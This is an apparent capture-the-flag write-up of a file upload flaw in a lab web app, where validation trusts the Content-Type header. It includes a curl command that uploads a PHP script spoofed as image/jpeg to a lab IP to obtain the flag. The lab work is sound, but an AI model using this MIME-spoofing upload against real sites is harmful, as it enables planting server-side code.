# Upload Image Vulnerability

## Discovery Process

1. Click on **Add image** button
2. Inspect the upload button and find:
```html
<input type="submit" name="Upload" value="Upload">
```
3. Identified that the upload functionality might not properly validate file types

## Vulnerability Details

- **Issue**: File upload validation relies on Content-Type header instead of actual file content
- **Attack vector**: Upload malicious script by spoofing MIME type to `image/jpeg`

## Exploitation

1. Create a PHP script file (`script.php`)
2. Upload the script using cURL while spoofing the Content-Type:

```bash
echo '<?php echo "Darkly" ?>' > 05_upload_image/script.php && curl -X POST \
-F "uploaded=@05_upload_image/script.php;type=image/jpeg" \
-F "Upload=Upload" \
"http://10.13.200.245/index.php?page=upload" | grep flag
```

3. The server accepts the upload because we specified `type=image/jpeg`, even though it's a PHP script
4. Successfully obtained the flag
